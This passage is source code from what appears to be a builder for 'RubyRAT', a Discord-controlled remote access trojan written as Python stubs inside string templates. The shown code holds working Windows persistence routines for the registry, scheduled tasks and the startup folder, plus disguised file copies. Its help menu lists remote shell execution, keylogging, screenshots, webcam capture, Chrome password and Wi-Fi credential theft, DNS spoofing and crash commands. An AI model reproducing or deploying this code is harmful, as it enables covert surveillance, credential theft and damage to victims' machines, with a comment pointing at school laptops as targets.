                                        print("Duplicated Script is not in the public directory. Copying...")
                                        # Copy the script to the public directory
                                        shutil.copy(script_path, copied_script_path)
                                        print(f"Duplicated Script copied to public directory! (Filename is **{publicFileName}**)")
                                    else:
                                        print(f"Duplicated Script is already in the public directory. (Filename is **{publicFileName}**)")

                                    current_status = CheckBetterPersistence(script_path)
                                    # Check and enable Registry Persistence if not already enabled
                                    if not current_status['registry_persistence']:
                                        try:
                                            print("Starting Registry Persistence phase...")
                                            registry_persistence(script_path)
                                            print("Registry Persistence done!")
                                        except Exception as e:
                                            print(f"Error starting registry persistence: {e}")
                                    else:
                                        print("Registry Persistence is already active.")

                                    # Check and enable Task Scheduler Persistence if not already enabled
                                    if not current_status['task_scheduler_persistence']:
                                        try:
                                            print("Starting Task Scheduler Persistence phase...")
                                            task_scheduler_persistence(script_path)
                                            print("Task Scheduler Persistence done!")
                                        except Exception as e:
                                            print(f"Error starting task scheduler persistence: {e}")
                                    else:
                                        print("Task Scheduler Persistence is already active.")

                                    # Check and enable Startup Persistence if not already enabled
                                    if not current_status['startup_persistence']:
                                        try:
                                            print("Starting Startup Persistence phase...")
                                            startup_persistence(script_path)
                                            print("Startup Persistence done!")
                                        except Exception as e:
                                            print(f"Error starting startup persistence: {e}")
                                    else:
                                        print("Startup Persistence is already active.")

                                    print("\n**Done with all phases! \nChecking status...**\n")
                                else:
                                    print("This feature is only supported on Windows.")
                            except Exception as os_error:
                                print(f"An error occurred while checking the operating system: {os_error}")
                    else:
                        print("Does not install on start!")

                    # Try to hide window:
                    if hideConsoleOnStart:
                        try:
                            print("Trying to hide window...")
                            # Run the command in the current console
                            try:
                                subprocess.run("DeviceCredentialDeployment", shell=True)
                            except Exception as e:
                                print(f"An error occurred while hiding window: {e}")
                            print("Window hidden!")
                        except Exception as e:
                            print(f"An error occurred while hiding window: {e}")
                    else:
                        print("Does not hide window!")

                    # ------------------------------------------------------------
                    #
                    #                     SETTINGS ENDS HERE
                    #
                    # ------------------------------------------------------------

                    # Try to start bot using primary token and if that fails, try alternative token
                    # Function to start the bot with a given token
                    async def start_bot(token):
                        try:
                            print(f"Trying to start bot...")
                            await bot.start(token)
                        except discord.LoginFailure:
                            print(f"Improper token has been passed.")
                            raise  # Re-raise the exception to handle it in the calling code

                    # Try to start bot using primary token and if that fails, try alternative token
                    async def main():
                        try:
                            await start_bot(primary_token)
                        except discord.LoginFailure:
                            try:
                                await start_bot(alternative_token)
                            except discord.LoginFailure as e:
                                print(f"Both primary and alternative tokens failed. Error: {e}")
                        except Exception as e:
                            print(f"An error occurred: {e}")

                    # Run the asynchronous main function
                    asyncio.run(main())
                    """;
            }
            else if (selectedVersion == "2.2.0")
            {
                originalStub = """
                    import os
                    import platform
                    import subprocess
                    import io
                    import socket
                    import sys
                    import shutil
                    import base64
                    import ctypes
                    import zipfile
                    import importlib

                    # Check if running as executable
                    running_as_executable = getattr(sys, 'frozen', False)


                    # List of required modules and their corresponding import names
                    required_modules = {
                        'psutil': 'psutil',
                        'discord': 'discord',
                        'pyautogui': 'pyautogui',
                        'pillow': 'PIL',
                        'opencv-python-headless': 'cv2',
                        'pynput': 'pynput',
                        'requests': 'requests',
                        'psutil': 'psutil',
                        'cryptography': 'cryptography',
                        'pygetwindow': 'pygetwindow',
                        'googlemaps': 'googlemaps',
                        'tkinter': 'tkinter',
                        'mb': 'mb',
                        'pywin32': 'win32crypt',
                        'pycryptodomex': 'Cryptodome.Cipher',
                        'winreg': 'winreg',
                        'asyncio': 'asyncio',
                    }

                    # Additional required module
                    missing_modules = []

                    for module, import_name in required_modules.items():
                        try:
                            # Attempt to import the module
                            importlib.import_module(import_name)
                        except ImportError:
                            # Module is missing, add it to the missing_modules list
                            missing_modules.append(module)

                    # Check and install required modules if needed
                    if missing_modules:
                        missing_modules_str = ", ".join(missing_modules)
                        print(f"Some required modules are missing: {missing_modules_str}")
                        print("Installing missing modules...")
                        try:
                            subprocess.check_call([sys.executable, "-m", "pip", "install"] + missing_modules_str.split(', '))
                            print("Modules installed successfully!")
                            # Determine the script filename dynamically
                            script_filename = sys.argv[0]

                            # Build the command to run the script with arguments
                            script_command = [sys.executable, script_filename]

                            # Start a new process to run the script
                            subprocess.Popen(script_command)

                            # Exit the current script
                            sys.exit()
                        except Exception as e:
                            print("An error occurred while installing modules:", e)
                            exit(1)
                    else:
                        print("All required modules are already installed.")


                    import discord
                    from discord.ext import commands
                    import requests
                    import pyautogui
                    from cryptography.fernet import Fernet, InvalidToken
                    from pynput import keyboard
                    from cryptography.hazmat.backends import default_backend
                    from cryptography.hazmat.primitives import hashes
                    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
                    from PIL import Image
                    import cv2
                    import pygetwindow as gw
                    import psutil
                    import googlemaps
                    from tkinter import messagebox as mb
                    import win32crypt
                    from Cryptodome.Cipher import AES
                    import csv
                    import json
                    import shutil
                    import base64
                    import sqlite3
                    import socket
                    import winreg
                    from pathlib import Path
                    import asyncio
                    import aiohttp

                    # Settings for build
                    installOnStart = 
                    """
                    +
                    cbCTS.Checked
                    +
                    """

                    askForUACOnStart = 
                    """
                    +
                    cbSE.Checked
                    +
                    """

                    disableUACOnStart = 
                    """
                    +
                    cbDUAC.Checked
                    +
                    """

                    hideConsoleOnStart = 
                    """
                    +
                    cbHT.Checked
                    +
                    """


                    categorieName = 
                    """
                    +
                    txtCategorie.Text
                    +
                    """

                    GOOGLE_API_KEY = 
                    """
                    +
                    txtGoogleAPI.Text
                    +
                    """

                    currentVersion = "2.2.0"

                    # Tokens for the bot
                    primary_token = 
                    """
                    +
                    txtInputToken.Text
                    +
                    """

                    alternative_token = 
                    """
                    +
                    txtBackupInputToken.Text
                    +
                    """


                    # Settings for presistence
                    registryName = 
                    """
                    +
                    txtPreReg.Text
                    +
                    """

                    taskName = 
                    """
                    +
                    txtPreTask.Text
                    +
                    """

                    startupName = 
                    """
                    +
                    txtPreStart.Text
                    +
                    """

                    publicFileName = 
                    """
                    +
                    txtPrePublic.Text
                    +
                    """


                    #intents = discord.Intents.default()
                    intents = discord.Intents.all()
                    intents.message_content = True

                    bot = commands.Bot(command_prefix='!', intents=intents)
                    created_channel = None  # To store the created channel object

                    script_path = os.path.abspath(__file__)

                    @bot.event
                    async def on_ready():
                        print(f'Logged in as {bot.user.name}')

                        # Create encryption key
                        key = Fernet.generate_key()
                        global cipher_suite
                        cipher_suite = Fernet(key)


                        global created_channel  # Declare the global variable
                        system_username = os.getlogin()  # Get the system's username

                        ip_address = requests.get('https://httpbin.org/ip').json()['origin'] # Get public IP address
                        print(f'Public IP Address: {ip_address}')

                        ip_address_with_dashes = ip_address.replace('.', '-')  # Replace periods with dashes

                        # Create the perfect name for chat
                        channel_name = f"{system_username}-{ip_address_with_dashes}"
                        channel_name_lowercase = channel_name.replace('.', '').lower()

                        guild = bot.guilds[0]  # Assuming the bot is in only one guild

                        category = discord.utils.get(guild.categories, name=categorieName) # Checking category to match the desired one
                        print(f'Category Name: {categorieName}')

                        # Execute the remove_channels function with the created_channel and channel_name
                        await remove_channels(guild, channel_name_lowercase)

                        # Find other active RubyRAT clients on local machine
                        try:
                            active_rubyRATs = await find_rubyrats()  # Await the coroutine here
                            if len(active_rubyRATs) > 0:
                                print("Found Python processes:")
                                for process in active_rubyRATs:
                                    print(f"Process ID: {process['pid']}, Name: {process['name']}")
                                    print(f"Trying to kill process: {process}")
                                    await kill_process(process['pid'])  # Kill the process
                            else:
                                print("No Python processes found.")
                        except Exception as e:
                            print("An error occurred:", e)
                        # Kill them...

                        # Create a new text channel with the unique name
                        if category is not None:
                            created_channel = await guild.create_text_channel(channel_name, category=category)
                        else:
                            created_channel = await guild.create_text_channel(channel_name)
                        print(f'Created Channel Name: {created_channel.name}')

                        # Send a message with the public IP address to the new channel
                        await created_channel.send(f"New client! (**Version is {currentVersion}**)\nPublic IP Address of the client: **{ip_address}**. Client is **admin = {is_admin()}**. Also, if you want to know more, type **!help**")

                    @bot.event
                    async def on_message(message):
                        if message.author == bot.user:
                            return

                        # Process !cmd messages
                        if message.channel == created_channel and message.content.startswith('!cmd'):
                            command_args = message.content.split(' ', 1)
                            if len(command_args) == 2:
                                output = CallME(command_args[1])
                                await message.channel.send(output)  # Send the output back to the chat

                        # Process !download messages
                        if message.channel == created_channel and message.content.startswith('!download'):
                            file_name = message.content.split(' ', 1)[1]
                            await DownloadFile(file_name, message.channel)

                        await bot.process_commands(message)

                    async def remove_channels(guild, ChannelName):
                        # Find the category with the specified name
                        category = discord.utils.get(guild.categories, name=categorieName)

                        if category is not None:
                            # Iterate through text channels within the category
                            for channel in category.text_channels:
                                if channel.name == ChannelName:
                                    #await channel.send('!kill2')
                                    #print(f"Sent '!kill2' to channel: {channel.name}")

                                    #await asyncio.sleep(5)
                                    await channel.delete()
                                    print(f"Deleted channel: {channel.name}")
                        else:
                            print(f"Category '{categorieName}' not found in this server.")

                    async def find_rubyrats():
                        try:
                            print("Trying to find RubyRATs...")
                            python_processes = []

                            # Get the current process ID of the script
                            current_process_id = os.getpid()

                            for process in psutil.process_iter(['pid', 'name']):
                                process_info = process.info
                                if "python" in process_info["name"].lower() and process_info["pid"] != current_process_id:
                                    # Check if the process name contains "python" and exclude the script's own process
                                    python_processes.append(process_info)

                            return python_processes
                        except Exception as e:
                            print("An error occurred:", e)
                            return []

                    async def kill_process(pid):
                        try:
                            process = psutil.Process(pid)
                            process.terminate()  # Terminate the process
                            print(f"Killed process with PID {pid}")
                        except psutil.NoSuchProcess:
                            print(f"Process with PID {pid} not found.")
                        except Exception as e:
                            print(f"An error occurred while killing the process with PID {pid}: {e}")

                    # Customize the built-in help command
                    bot.remove_command('help')  # Remove the default help command

                    @bot.command(pass_context=True)
                    async def help(ctx):
                        global created_channel
                        if ctx.channel == created_channel and ctx.message.content == '!help':
                            help_messages = (
                            f"**Available Commands on Version {currentVersion}:**\n"
                            "\n**GENERAL**\n"
                            "`!help` - Show this menu.\n"
                            "`!cmd <command>` - Execute a shell command.\n"
                            "`!restart` - Will disconnect and then hopefully reconnect the bot.\n"
                            "`!version` - Prints out current version.\n"
                            "`!kill` - Disconnect the bot and remove the chat channel.\n"

                            "\n**FILE MANAGEMENT**\n"
                            "`!download <filename>` - Download a file from the system.\n"
                            "`!upload` - Upload a file to the bot.\n"
                            "`!cat <filename>` - Display contents of a file (Must be less then 2000 characters...).\n"

                            "\n**SUVAILLANCE**\n"
                            "`!screenshot` - Sends a frame of desktop from client to chat.\n"
                            "`!webcam` - Takes a picture using clients webcam and sends it in chat.\n"
                            "`!info` - Display some system information, such as GPU, CPU, RAM and more!.\n"
                            "`!geolocate` - Calculates position using google maps API.\n"

                            "\n**PERSISTENCE**\n"
                            "`!elevate` - Will try to elevate client from user to admin.\n"
                            "`!install` - Try to get presisence on client system.\n"
                            "`!uninstall` - Will remove presisence from client system.\n"
                            "`!better_install` - Gets presistence on system with 3 diffrent methods. (May need admin)\n"
                            "`!better_uninstall` - Removes 3 diffrent methods of presistence from client system. (May need admin)\n"
                            "`!better_check` - Checks if 3 diffrent methods of presistence is active on client system. (May need admin)\n"
                            "`!cool_install` - Installs a interesting method of presistence that exploits some computers. (Will need admin)\n"
                            "`!cool_uninstall` - Uninstalls a interesting method of presistence that exploits some computers. (Will need admin)\n"

                            "\n**RECOVERY**\n"
                            "`!history` - Gather and download all web history from client.\n",
                            "`!passwords_chrome` - If client has chrome, it will retrieve all saved usernames, passwords and URL's to the website.\n"
                            "`!network` - Retrieve all saved network names their passwords (names with characters like å, ä, ö will not work correctly).\n"

                            "\n**KEYLOGGER**\n"
                            "`!dumplog` - Sends a file containing the keyloggers findings to C2.\n"
                            "`!startlog` - Start the keylogging.\n"
                            "`!stoplog` - Stop the keylogging.\n"

                            "\n**ENCRYPTION**\n"
                            "`!encrypt <filename> <password>` - Encrypt a file with a special password.\n"
                            "`!decrypt <filename> <password>` - Decrypt a file with the special password.\n"

                            "\n**DNS Spoofing**\n"
                            "`!block_website <domain>` - Blocks a website on the clients computer.\n"
                            "`!unblock_website <domain>` - Unblocks a website on the clients computer.\n"
                            "`!spoof_dns <domain> <ip>` - Spoofs a domain to a specified IP.\n"

                            "\n**MISC**\n"
                            "`!volume <volume_procent>` - Changes volume to the given procentage.\n"
                            "`!sendkey <Hello-World>` - Sends specified keys to client. **Instructions here: https://ss64.com/vb/sendkeys.html**\n"
                            "`!messagebox <error\warning\info> <title> <content>` - Sends a custom made messagebox to client.\n"
                            "`!securefile <filepath>` - Nulls out file to make it near-impossible to recover.\n"
                            "`!BSOD <svchost\explorer>` - Diffrent ways to make clients system unstable.\n"
                            "`!interactive_cmd` - Starts a CMD terminal in discord. (Avoid using commands that output much information, like \"dir\")\n"
                            )
                            for message in help_messages:
                                await ctx.send(message)    

                    @bot.command()
                    async def kill(ctx):
                        global created_channel
                        if ctx.channel == created_channel and ctx.message.content == '!kill':
                            await ctx.send("Disconnecting and removing chat channel...")
                            if created_channel:
                                await created_channel.delete()
                            await bot.close()
                            os._exit(0)

                    @bot.command()
                    async def info(ctx):
                        if ctx.channel == created_channel and ctx.message.content == '!info':
                            system_info = get_system_info()
                            await ctx.send(f"System Information:\n```\n{system_info}\n```")

                    @bot.command()
                    async def screenshot(ctx):
                        global created_channel
                        if ctx.channel == created_channel and ctx.message.content == '!screenshot':
                            try:
                                # Capture the screenshot using pyautogui
                                screenshot = pyautogui.screenshot()


                                # Save the screenshot to a file
                                screenshot_path = 'screenshot.png'
                                screenshot.save(screenshot_path)

                                # Upload the screenshot to Discord
                                await ctx.send(file=discord.File(screenshot_path))

                                # Remove the temporary file
                                os.remove(screenshot_path)
                            except Exception as e:
                                await ctx.send(f"An error occurred: {e}")

                    @bot.command()
                    async def webcam(ctx):
                        global created_channel

                        if ctx.channel == created_channel and ctx.message.content == '!webcam':
                            try:
                                # Initialize the webcam capture
                                cap = cv2.VideoCapture(0)  # 0 indicates the default webcam

                                if cap.isOpened():
                                    # Capture a single frame from the webcam
                                    ret, frame = cap.read()

                                    if ret:
                                        # Save the captured image to a file
                                        image_path = 'webcam_image.png'
                                        cv2.imwrite(image_path, frame)

                                        # Upload the image to Discord
                                        await ctx.send(file=discord.File(image_path))

                                        # Remove the temporary image file
                                        os.remove(image_path)

                                    else:
                                        await ctx.send("Failed to capture image from webcam.")
                                else:
                                    await ctx.send("Webcam not available.")

                                # Release the webcam
                                cap.release()

                            except Exception as e:
                                await ctx.send(f"An error occurred: {e}")

                    @bot.command()
                    async def version(ctx):
                        if ctx.channel == created_channel:    
                            print(f"Version is {currentVersion}")
                            await ctx.send(f"Current version is {currentVersion}")


                    # ---------------------------------------------------------------------------
                    #
                    #                            TEST ZONE STARTS HERE
                    #
                    # ---------------------------------------------------------------------------

                    @bot.command()
                    async def Startups(ctx):
                        if ctx.channel == created_channel:
                            if is_admin():
                                await ctx.send("User has administrative privileges, starting to gather startup information...")

                                # Get startup folder
                                startup_folder = Path(os.path.expanduser("~")) / 'AppData' / 'Roaming' / 'Microsoft' / 'Windows' / 'Start Menu' / 'Programs' / 'Startup'
                                startup_folder_files = os.listdir(startup_folder)
                                startup_folder_files = [str(startup_folder / file) for file in startup_folder_files]

                                # Get registry startup
                                registry_key = r'Software\\Microsoft\\Windows\\CurrentVersion\\Run'
                                registry_startup = []
                                try:
                                    with winreg.OpenKey(winreg.HKEY_CURRENT_USER, registry_key, 0, winreg.KEY_READ) as registry:
                                        index = 0
                                        while True:
                                            try:
                                                value_name, value_data, value_type = winreg.EnumValue(registry, index)
                                                registry_startup.append(value_data)
                                                index += 1
                                            except OSError:
                                                break
                                except Exception as e:
                                    await ctx.send(f"Error getting registry startup: {e}")

                                # Get task scheduler startup
                                task_scheduler_startup = []
                                try:
                                    result = os.system(f'schtasks /query /tn {taskName}')
                                    if result == 0:
                                        task_scheduler_startup.append(taskName)
                                except Exception as e:
                                    await ctx.send(f"Error getting task scheduler startup: {e}")

                                # Send startup information to chat
                                await ctx.send("Startup information:")

                                # Send registry startup items
                                await ctx.send("**REGISTRY:**")
                                for item in registry_startup:
                                    await ctx.send(f"• {item}")

                                # Send task scheduler startup items
                                await ctx.send("**TASK SCHEDULER:**")
                                for item in task_scheduler_startup:
                                    await ctx.send(f"• {item}")

                                # Send startup folder items
                                await ctx.send("**STARTUP FOLDER:**")
                                for item in startup_folder_files:
                                    await ctx.send(f"• {item}")

                            else:
                                await ctx.send("You do not have the necessary administrative privileges to perform this operation. !elevate will help...")


                    # ---------------------------------------------------------------------------
                    #
                    #                              TEST ZONE ENDS HERE
                    #
                    # ---------------------------------------------------------------------------

                    # DNS Stuff
                    @bot.command()
                    async def block_website(ctx, domain):
                        if ctx.channel == created_channel:
                            # Check if client is admin
                            if is_admin():
                                # Check if there is a domain
                                if domain:
                                    try:
                                        # Add the domain to the hosts file
                                        with open('C:/Windows/System32/drivers/etc/hosts', 'a') as hosts_file:
                                            hosts_file.write(f"\n127.0.0.1 {domain}")
                                        await ctx.send(f"Successfully blocked {domain}.")
                                        await ctx.send("Restarting DNS Client service...")
                                        # Restart the DNS Client service
                                        os.system('ipconfig /flushdns')
                                        await ctx.send("DNS Client service restarted!")
                                    except:
                                        await ctx.send("Failed to block website.")
                            else:
                                await ctx.send("You do not have the necessary administrative privileges to perform this operation. !elevate will help...")
                    @bot.command()
                    async def unblock_website(ctx, domain):
                        if ctx.channel == created_channel:
                            # Check if client is admin
                            if is_admin():
                                # Check if there is a domain
                                if domain:
                                    try:
                                        # Remove the domain from the hosts file
                                        with open('C:/Windows/System32/drivers/etc/hosts', 'r') as hosts_file:
                                            lines = hosts_file.readlines()
                                        with open('C:/Windows/System32/drivers/etc/hosts', 'w') as hosts_file:
                                            for line in lines:
                                                if line.startswith(f"127.0.0.1 {domain}"):
                                                    # Remove line
                                                    continue
                                                hosts_file.write(line)
                                        await ctx.send(f"Successfully unblocked {domain}.")
                                        await ctx.send("Restarting DNS Client service...")
                                        # Restart the DNS Client service
                                        os.system('ipconfig /flushdns')
                                        await ctx.send("DNS Client service restarted!")
                                    except:
                                        await ctx.send("Failed to unblock website.")
                            else:
                                await ctx.send("You do not have the necessary administrative privileges to perform this operation. !elevate will help...")
                    @bot.command()
                    async def spoof_dns(ctx, domain, ip):
                        if ctx.channel == created_channel:
                            # Check if client is admin
                            if is_admin():
                                # Check if there is a domain
                                if domain:
                                    try:
                                        # Add the domain to the hosts file
                                        with open('C:/Windows/System32/drivers/etc/hosts', 'a') as hosts_file:
                                            hosts_file.write(f"\n{ip} {domain}")
                                        await ctx.send(f"Successfully spoofed {domain} to {ip}.")
                                        await ctx.send("Restarting DNS Client service...")
                                        # Restart the DNS Client service
                                        os.system('ipconfig /flushdns')
                                        await ctx.send("DNS Client service restarted!")
                                    except:
                                        await ctx.send("Failed to spoof DNS.")
                            else:
                                await ctx.send("You do not have the necessary administrative privileges to perform this operation. !elevate will help...")


                    # Blue Screen Of Death
                    @bot.command()
                    async def BSOD(ctx, type):
                        if type == "explorer":
                            if ctx.channel == created_channel:
                                if is_admin():
                                    await ctx.send("Starting BSOD...")
                                    os.system("taskkill /f /im explorer.exe")
                                    await ctx.send("BSOD started!")
                                else:
                                    await ctx.send("You do not have the necessary administrative privileges to perform this operation. !elevate will help...")
                        elif type == "svchost":
                            if ctx.channel == created_channel:
                                if is_admin():
                                    await ctx.send("Starting BSOD...")
                                    os.system("taskkill /f /im svchost.exe")
                                    await ctx.send("BSOD started!")
                                else:
                                    await ctx.send("You do not have the necessary administrative privileges to perform this operation. !elevate will help...")
                        else:
                            await ctx.send("Please specify a valid BSOD type. (explorer or svchost)")


                    # Cool presistence method that only works for the school laptops.
                    @bot.command()
                    async def cool_install(ctx):
                        if ctx.channel == created_channel:
                            if is_admin():
                                await ctx.send("User has administrative privileges, starting to add persistence...")
                                # Make a new copy with content of current file to "C:\Windows\security\database\system32.log"
                                # Specify the script you want to run
                                script_to_run = 'C:\\Windows\\security\\database\\system32.log'
                                script_path = os.path.abspath(sys.argv[0])

                                # Write your script content to the specified file
                                shutil.copy(script_path, script_to_run)

                                # Add registry that executes "pythonw C:\Windows\security\database\system32.log"
                                registry_key = r'Software\Microsoft\Windows\CurrentVersion\Run'
                                registry_name = 'System32'
                                registry_value = 'pythonw.exe ' + script_to_run

                                try:
                                    import winreg
                                    key = winreg.HKEY_CURRENT_USER
                                    with winreg.OpenKey(key, registry_key, 0, winreg.KEY_WRITE) as registry:
                                        winreg.SetValueEx(registry, registry_name, 0, winreg.REG_SZ, registry_value)
                                    await ctx.send("Persistence added successfully.")
                                except Exception as e:
                                    await ctx.send(f"Failed to add persistence: {str(e)}")
                            else:
                                await ctx.send("You do not have the necessary administrative privileges to perform this operation.")

                    # Removes the cool presistence method that only works for the school laptops.
                    @bot.command()
                    async def cool_uninstall(ctx):
                        if ctx.channel == created_channel:
                            if is_admin():
                                await ctx.send("User has administrative privileges, starting to remove persistence...")

                                # Remove registry key
                                registry_key = r'Software\Microsoft\Windows\CurrentVersion\Run'
                                registry_name = 'System32'

                                try:
                                    # Remove the System32.log file
                                    script_to_run = 'C:\\Windows\\security\\database\\system32.log'
                                    os.remove(script_to_run)

                                    # Remove the registry key
                                    import winreg
                                    key = winreg.HKEY_CURRENT_USER
                                    with winreg.OpenKey(key, registry_key, 0, winreg.KEY_WRITE) as registry:
                                        winreg.DeleteValue(registry, registry_name)
                                    await ctx.send("Persistence removed successfully.")
                                except Exception as e:
                                    await ctx.send(f"Failed to remove persistence: {str(e)}")
                            else:
                                await ctx.send("You do not have the necessary administrative privileges to perform this operation.")

                    # Method to return true or false if cool persistence method is installed
                    def cool_persistence_exists():
                        # Check if the registry key exists
                        registry_key = r'Software\Microsoft\Windows\CurrentVersion\Run'
                        registry_name = 'System32'

                        try:
                            import winreg
                            key = winreg.HKEY_CURRENT_USER
                            with winreg.OpenKey(key, registry_key, 0, winreg.KEY_READ) as registry:
                                value, _ = winreg.QueryValueEx(registry, registry_name)
                            return value == 'pythonw.exe C:\\Windows\\security\\database\\system32.log'
                        except Exception as e:
                            return False

                    # Better presistence method that uses 3 diffrent methods.
                    @bot.command()
                    async def better_install(ctx):
                        if ctx.channel == created_channel and ctx.message.content == "!better_install":
                            script_path = os.path.abspath(sys.argv[0])

                            try:
                                # Check the current persistence status
                                current_status = CheckBetterPersistence(script_path)

                                response = "**Persistence Status:**\n"
                                response += f"Registry Persistence: {'Enabled' if current_status['registry_persistence'] else 'Not Enabled'}\n"
                                response += f"Task Scheduler Persistence: {'Enabled' if current_status['task_scheduler_persistence'] else 'Not Enabled'}\n"
                                response += f"Startup Persistence: {'Enabled' if current_status['startup_persistence'] else 'Not Enabled'}\n\n"

                                await ctx.send(response)

                                await ctx.send("\n**Starting...**\n")
                                await ctx.send("Starting Duplicated Script phase...")
                                # Check if the cloned script is in the public directory
                                public_directory = Path('C:/Users/Public')
                                copied_script_path = public_directory / (publicFileName + ".pyw")
                                if (Path.exists(copied_script_path)):
                                    await ctx.send(f"Duplicated Script is already in the public directory. (Filename is **{publicFileName}**)")
                                else:
                                    await ctx.send("Duplicated Script is not in the public directory. Copying...")
                                    # Copy the script to the public directory
                                    shutil.copy(script_path, copied_script_path)
                                    await ctx.send(f"Duplicated Script copied to public directory! (Filename is **{publicFileName}**)")

                                # Check and enable Registry Persistence if not already enabled
                                if not current_status['registry_persistence']:
                                    try:
                                        await ctx.send("Starting Registry Persistence phase...")
                                        registry_persistence(script_path)
                                        await ctx.send("Registry Persistence done!")
                                    except Exception as e:
                                        await ctx.send(f"Error starting registry persistence: {e}")
                                else:
                                    await ctx.send("Registry Persistence is already active.")

                                # Check and enable Task Scheduler Persistence if not already enabled
                                if not current_status['task_scheduler_persistence']:
                                    try:
                                        await ctx.send("Starting Task Scheduler Persistence phase...")
                                        task_scheduler_persistence(script_path)
                                        await ctx.send("Task Scheduler Persistence done!")
                                    except Exception as e:
                                        await ctx.send(f"Error starting task scheduler persistence: {e}")
                                else:
                                    await ctx.send("Task Scheduler Persistence is already active.")

                                # Check and enable Startup Persistence if not already enabled
                                if not current_status['startup_persistence']:
                                    try:
                                        await ctx.send("Starting Startup Persistence phase...")
                                        startup_persistence(script_path)
                                        await ctx.send("Startup Persistence done!")
                                    except Exception as e:
                                        await ctx.send(f"Error starting startup persistence: {e}")
                                else:
                                    await ctx.send("Startup Persistence is already active.")

                                await ctx.send("\n**Done with all phases! \nChecking status...**\n")

                                # Check the current persistence status
                                current_status = CheckBetterPersistence(script_path)

                                NewResponse = "**New Persistence Status:**\n"
                                NewResponse += f"Registry Persistence: {'Enabled' if current_status['registry_persistence'] else 'Not Enabled'}\n"
                                NewResponse += f"Task Scheduler Persistence: {'Enabled' if current_status['task_scheduler_persistence'] else 'Not Enabled'}\n"
                                NewResponse += f"Startup Persistence: {'Enabled' if current_status['startup_persistence'] else 'Not Enabled'}\n\n"

                                await ctx.send(NewResponse)

                            except Exception as e:
                                await ctx.send(f"An error occurred: {e}")

                    def registry_persistence(script_path):
                        key = r'Software\Microsoft\Windows\CurrentVersion\Run'

                        # Copy the original script to C:\Users\Public
                        public_directory = Path('C:/Users/Public')
                        copied_script_path = public_directory / (publicFileName + ".pyw")
                        shutil.copy(script_path, copied_script_path)

                        try:
                            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_WRITE) as registry_key:
                                winreg.SetValueEx(registry_key, registryName, 0, winreg.REG_SZ, str(copied_script_path))
                        except Exception as e:
                            print(f"Error adding registry persistence: {e}")

                        #os.system(f'start /MIN "{copied_script_path}"')

                    def task_scheduler_persistence(script_path):
                        # Automatically determine the username
                        username = os.getlogin()

                        # Get the directory of the currently running Python interpreter
                        python_dir = Path(sys.executable).parent

                        # Define a list of possible paths to search for pythonw.exe
                        possible_paths = [
                            python_dir / 'pythonw.exe',
                            python_dir / 'pythonw3.11.exe',  # Assuming Python 3.11
                            python_dir / 'pythonw3.9.exe',   # Assuming Python 3.9
                            Path(f'C:/Users/{username}/AppData/Local/Programs/Python/Python39/pythonw.exe'),  
                            Path(f'C:/Users/{username}/AppData/Local/Programs/Python/Python311/pythonw.exe'),  
                            Path(f'C:/Users/{username}/AppData/Local/Microsoft/WindowsApps/pythonw.exe'), 
                            Path(f'C:/Users/{username}/AppData/Local/Microsoft/WindowsApps/pythonw3.11.exe'), 
                        ]

                        # Find the first valid path to pythonw.exe
                        pythonw_path = next((path for path in possible_paths if path.is_file()), None)

                        if pythonw_path is None:
                            print("pythonw.exe not found while searching for task scheduler persistence.")
                            return None
                        else:
                            # Specify the path to the public directory
                            public_directory = Path('C:/Users/Public')

                            # Specify the path to place duplicate of script (Filename for duplicate is the "publicFileName" variable)
                            copied_script_path = public_directory / (publicFileName + ".pyw")

                            # Copy the script to the public directory
                            shutil.copyfile(script_path, copied_script_path)

                            # Use os.system to create a scheduled task
                            os.system(f"SCHTASKS /Create /SC ONSTART /TN {taskName} /TR \"{pythonw_path} {copied_script_path}\" /RU {username} /f")

                    def startup_persistence(script_path):
                        # Automatically determine the username
                        username = os.getlogin()

                        # Get the directory of the currently running Python interpreter
                        python_dir = Path(sys.executable).parent

                        # Define a list of possible paths to search for pythonw.exe
                        possible_paths = [
                            python_dir / 'pythonw.exe',
                            python_dir / 'pythonw3.11.exe',  # Assuming Python 3.11
                            python_dir / 'pythonw3.9.exe',   # Assuming Python 3.9
                            Path(f'C:/Users/{username}/AppData/Local/Programs/Python/Python39/pythonw.exe'),  
                            Path(f'C:/Users/{username}/AppData/Local/Programs/Python/Python311/pythonw.exe'),  
                            Path(f'C:/Users/{username}/AppData/Local/Microsoft/WindowsApps/pythonw.exe'), 
                            Path(f'C:/Users/{username}/AppData/Local/Microsoft/WindowsApps/pythonw3.11.exe'), 
                        ]

                        # Find the first valid path to pythonw.exe
                        pythonw_path = next((path for path in possible_paths if path.is_file()), None)

                        if pythonw_path is None:
                            print("pythonw.exe not found while searching for task scheduler persistence.")
                            return None
                        else:
                            public_directory = Path('C:/Users/Public')
                            copied_script_path = public_directory / (publicFileName + ".pyw")
                            shutil.copy(script_path, copied_script_path)

                            startup_folder = Path(os.path.expanduser("~")) / 'AppData' / 'Roaming' / 'Microsoft' / 'Windows' / 'Start Menu' / 'Programs' / 'Startup'

                            with open(f'{startup_folder}/{startupName}.bat', 'w') as batch_file:
                                batch_file.write(fr'''@echo off
                        start "" /B "{pythonw_path}" "{copied_script_path}"
                        :: @echo off
                        :: start "" /B /MIN {pythonw_path} C:\Users\Public\{registryName}.pyw
                        ''')

                            os.system(f'copy {startupName}.bat "{startup_folder}"')
                            os.remove(f'{startupName}.bat')


                    # Checking of pre
                    @bot.command()
                    async def better_check(ctx):
                        if ctx.channel == created_channel and ctx.message.content == "!better_check":
                            script_path = os.path.abspath(sys.argv[0])
                            # Check the current persistence status
                            current_status = CheckBetterPersistence(script_path)
                            response = "**Persistence Status:**\n"
                            response += f"**Registry** Persistence: **{'Enabled' if current_status['registry_persistence'] else 'Not Enabled'}** (Keyname is **{registryName}** and Actual filename is **{publicFileName}.pyw**)\n"
                            response += f"**Task Scheduler** Persistence: **{'Enabled' if current_status['task_scheduler_persistence'] else 'Not Enabled'}** (Taskname is **{taskName}** and Actual filename is **{publicFileName}.pyw**)\n"
                            response += f"**Startup** Persistence: **{'Enabled' if current_status['startup_persistence'] else 'Not Enabled'}** (Startup filename is **{startupName}.bat** and Actual filename is **{publicFileName}.pyw**)\n\n"

                            await ctx.send(response)

                    def CheckBetterPersistence(script_path):
                        registry_persistence_exists = check_registry_persistence(script_path)
                        task_scheduler_persistence_exists = check_task_scheduler_persistence(script_path)
                        startup_persistence_exists = check_startup_persistence(script_path)

                        return {
                            "registry_persistence": registry_persistence_exists,
